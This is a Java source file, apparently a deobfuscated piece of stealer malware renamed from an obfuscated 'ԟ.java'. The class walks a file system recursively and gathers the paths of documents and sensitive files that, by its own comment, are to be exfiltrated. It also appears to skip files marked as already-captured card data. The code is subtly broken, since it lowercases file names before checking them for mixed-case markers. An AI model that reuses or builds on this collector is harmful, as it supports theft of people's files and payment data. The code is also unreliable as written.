import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.List;

/**
 * Cleaned SearchFileVisitor (formerly ԟ.java)
 * Recursively visits files and collects paths of documents and 
 * sensitive files to be exfiltrated.
 */
public class SearchFileVisitor extends SimpleFileVisitor<Path> {
    private final List<Path> collectedPaths;

    public SearchFileVisitor(List<Path> collectedPaths) {
        this.collectedPaths = collectedPaths;
    }

    @Override
    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
        String fileName = file.getFileName().toString().toLowerCase();
        
        // Exclude specific files already processed or irrelevant
        if (!fileName.contains("[CARD DETECTED]") && !fileName.contains("Card Name:")) {
            this.collectedPaths.add(file);
        }
        
        return FileVisitResult.CONTINUE;
    }

    @Override
    public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {
        return FileVisitResult.CONTINUE;
    }
}
